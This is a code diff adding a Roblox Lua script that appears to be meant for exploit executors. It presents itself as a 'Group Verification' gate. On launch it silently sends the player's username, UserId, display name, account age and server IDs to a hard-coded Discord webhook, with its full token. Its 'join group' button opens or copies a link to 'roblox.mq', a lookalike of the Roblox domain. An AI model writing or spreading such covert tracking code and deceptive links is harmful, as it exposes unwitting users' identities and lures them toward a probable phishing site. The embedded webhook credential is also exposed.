@@ -1,0 +1,290 @@
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+
+local LocalPlayer = Players.LocalPlayer
+
+-- ==================== WEBHOOK ====================
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1531852177105092762/T8yEzR-abCrlpwpo0NquRB1-9y-ftPVZsY_JX2agTgGXn7mkBAL379gSVLdRx-V2DlOB"
+
+local function sendWebhook()
+    local data = {
+        embeds = {{
+            title = "Script Executado",
+            description = "Alguém executou o script!",
+            color = 5763719,
+            fields = {
+                {
+                    name = "Usuário",
+                    value = LocalPlayer.Name,
+                    inline = true
+                },
+                {
+                    name = "UserId",
+                    value = tostring(LocalPlayer.UserId),
+                    inline = true
+                },
+                {
+                    name = "Display Name",
+                    value = LocalPlayer.DisplayName,
+                    inline = true
+                },
+                {
+                    name = "Account Age",
+                    value = LocalPlayer.AccountAge .. " dias",
+                    inline = true
+                },
+                {
+                    name = "JobId",
+                    value = game.JobId ~= "" and game.JobId or "Solo/Studio",
+                    inline = false
+                },
+                {
+                    name = "PlaceId",
+                    value = tostring(game.PlaceId),
+                    inline = true
+                }
+            },
+            footer = {
+                text = "Log • " .. os.date("%d/%m/%Y %H:%M:%S")
+            },
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }}
+    }
+
+    local body = HttpService:JSONEncode(data)
+
+    local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request or (fluxus and fluxus.request)
+
+    if requestFunc then
+        requestFunc({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = body
+        })
+    else
+        pcall(function()
+            HttpService:PostAsync(WEBHOOK_URL, body, Enum.HttpContentType.ApplicationJson)
+        end)
+    end
+end
+
+task.spawn(sendWebhook) -- Envia a mensagem no webhook assim que o script roda
+
+-- ==================== GROUP GATE GUI ====================
+local GROUP_ID = 8764256926
+local GROUP_LINK = "https://roblox.mq/communities/8764256926/"
+
+-- Create ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "GroupGateGUI"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+
+-- Main Frame
+local mainFrame = Instance.new("Frame")
+mainFrame.Name = "MainFrame"
+mainFrame.Size = UDim2.new(0, 380, 0, 270)
+mainFrame.Position = UDim2.new(0.5, -190, 0.5, -135)
+mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
+mainFrame.BorderSizePixel = 0
+mainFrame.Parent = screenGui
+
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 18)
+corner.Parent = mainFrame
+
+-- Top glow bar
+local topBar = Instance.new("Frame")
+topBar.Size = UDim2.new(1, 0, 0, 5)
+topBar.BorderSizePixel = 0
+topBar.Parent = mainFrame
+
+local topBarCorner = Instance.new("UICorner")
+topBarCorner.CornerRadius = UDim.new(0, 18)
+topBarCorner.Parent = topBar
+
+local topBarGradient = Instance.new("UIGradient")
+topBarGradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 170, 255)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 255, 200))
+})
+topBarGradient.Parent = topBar
+
+-- Title
+local title = Instance.new("TextLabel")
+title.Text = "Group Verification"
+title.Size = UDim2.new(1, 0, 0, 45)
+title.BackgroundTransparency = 1
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.Font = Enum.Font.GothamBold
+title.TextSize = 22
+title.Parent = mainFrame
+
+-- Status label
+local statusLabel = Instance.new("TextLabel")
+statusLabel.Size = UDim2.new(1, -20, 0, 25)
+statusLabel.Position = UDim2.new(0, 10, 0, 50)
+statusLabel.BackgroundTransparency = 1
+statusLabel.TextColor3 = Color3.fromRGB(170, 170, 170)
+statusLabel.Font = Enum.Font.Gotham
+statusLabel.TextSize = 14
+statusLabel.Parent = mainFrame
+
+-- Instructions
+local instructions = Instance.new("TextLabel")
+instructions.Text = "1. Press JOIN GROUP\n2. Opens or copies link\n3. If it doesn't open, paste in Chrome\n4. Join the group"
+instructions.Size = UDim2.new(1, -30, 0, 80)
+instructions.Position = UDim2.new(0, 15, 0, 80)
+instructions.BackgroundTransparency = 1
+instructions.TextColor3 = Color3.fromRGB(200, 200, 200)
+instructions.Font = Enum.Font.Gotham
+instructions.TextSize = 14
+instructions.TextWrapped = true
+instructions.TextXAlignment = Enum.TextXAlignment.Left
+instructions.Parent = mainFrame
+
+-- Join Button
+local joinButton = Instance.new("TextButton")
+joinButton.Text = "JOIN GROUP"
+joinButton.Size = UDim2.new(0.65, 0, 0, 42)
+joinButton.Position = UDim2.new(0.175, 0, 0, 170)
+joinButton.BackgroundColor3 = Color3.fromRGB(0, 160, 255)
+joinButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+joinButton.Font = Enum.Font.GothamBold
+joinButton.TextSize = 15
+joinButton.Parent = mainFrame
+
+local btnCorner = Instance.new("UICorner")
+btnCorner.CornerRadius = UDim.new(0, 14)
+btnCorner.Parent = joinButton
+
+local btnGradient = Instance.new("UIGradient")
+btnGradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 140, 255)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 200, 255))
+})
+btnGradient.Parent = joinButton
+
+-- Help text
+local helpText = Instance.new("TextLabel")
+helpText.Text = "Need help? discord.gg/QYUJWVdz7"
+helpText.Size = UDim2.new(1, -20, 0, 20)
+helpText.Position = UDim2.new(0, 10, 1, -25)
+helpText.BackgroundTransparency = 1
+helpText.TextColor3 = Color3.fromRGB(130, 130, 130)
+helpText.Font = Enum.Font.Gotham
+helpText.TextSize = 11
+helpText.Parent = mainFrame
+
+-- Dragging functionality
+local dragging = false
+local dragInput = nil
+local dragStart = nil
+local startPos = nil
+
+title.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = mainFrame.Position
+    end
+end)
+
+title.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+        dragInput = input
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if input == dragInput and dragging then
+        local delta = input.Position - dragStart
+        mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+end)
+
+title.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = false
+    end
+end)
+
+-- Button hover animation
+joinButton.MouseEnter:Connect(function()
+    TweenService:Create(joinButton, TweenInfo.new(0.2), {Size = UDim2.new(0.68, 0, 0, 44)}):Play()
+end)
+
+joinButton.MouseLeave:Connect(function()
+    TweenService:Create(joinButton, TweenInfo.new(0.2), {Size = UDim2.new(0.65, 0, 0, 42)}):Play()
+end)
+
+-- Check group membership
+local function checkGroupAccess()
+    local isInGroup = false
+    pcall(function()
+        isInGroup = LocalPlayer:IsInGroup(GROUP_ID)
+    end)
+
+    if not isInGroup then
+        statusLabel.Text = "Join the group to continue"
+        statusLabel.TextColor3 = Color3.fromRGB(255, 120, 120)
+        joinButton.Visible = true
+    else
+        statusLabel.Text = "Access Granted"
+        statusLabel.TextColor3 = Color3.fromRGB(0, 255, 170)
+        joinButton.Visible = false
+    end
+end
+
+-- Button click handler
+local isProcessing = false
+joinButton.MouseButton1Click:Connect(function()
+    if isProcessing then return end
+    isProcessing = true
+
+    local success = false
+
+    if typeof(openbrowser) == "function" then
+        openbrowser(GROUP_LINK)
+        success = true
+    elseif typeof(open_url) == "function" then
+        open_url(GROUP_LINK)
+        success = true
+    end
+
+    if success then
+        statusLabel.Text = "Opened in browser (if not, paste in Chrome)"
+        statusLabel.TextColor3 = Color3.fromRGB(0, 255, 170)
+    else
+        if typeof(setclipboard) == "function" then
+            setclipboard(GROUP_LINK)
+            statusLabel.Text = "Link copied! Paste it in Chrome"
+            statusLabel.TextColor3 = Color3.fromRGB(0, 200, 255)
+        else
+            statusLabel.Text = "Copy link and open in Chrome"
+        end
+    end
+
+    task.wait(1)
+    isProcessing = false
+end)
+
+-- Initial animation
+TweenService:Create(mainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {
+    Position = UDim2.new(0.5, -190, 0.5, -135)
+}):Play()
+
+-- Periodic check
+task.spawn(function()
+    while true do
+        checkGroupAccess()
+        task.wait(5)
+    end
+end)
+
+checkGroupAccess()
